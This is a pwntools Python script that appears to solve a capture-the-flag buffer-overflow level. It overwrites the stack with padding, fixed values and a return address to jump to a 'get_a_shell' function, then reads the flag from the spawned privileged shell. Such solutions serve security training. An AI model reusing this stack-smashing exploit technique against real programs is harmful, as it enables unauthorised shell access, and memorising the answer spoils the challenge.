# SETUP BOILERPLATE
from pwn import *
import os

elf = ELF('./bof-level04') # replace this with the actual level
DEBUG = False # toggles gdb.debug or process

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = elf.debug(env={}, gdbscript="""
b main
continue
""")

else:
    io = elf.process(env={})


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

get_a_shell = p32(elf.symbols["get_a_shell"])

buf_len = 20

a = 0x48474645 
b = 0x44434241

ret_addr = p32(0x804876b)
main_base = 0xffffde28
main_end  = 0xffffde10

payload = b"A" * buf_len + p32(b) + p32(a) + b"A" * 8 + ret_addr + (main_base - main_end + 4) * b"A" + get_a_shell
io.sendline(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
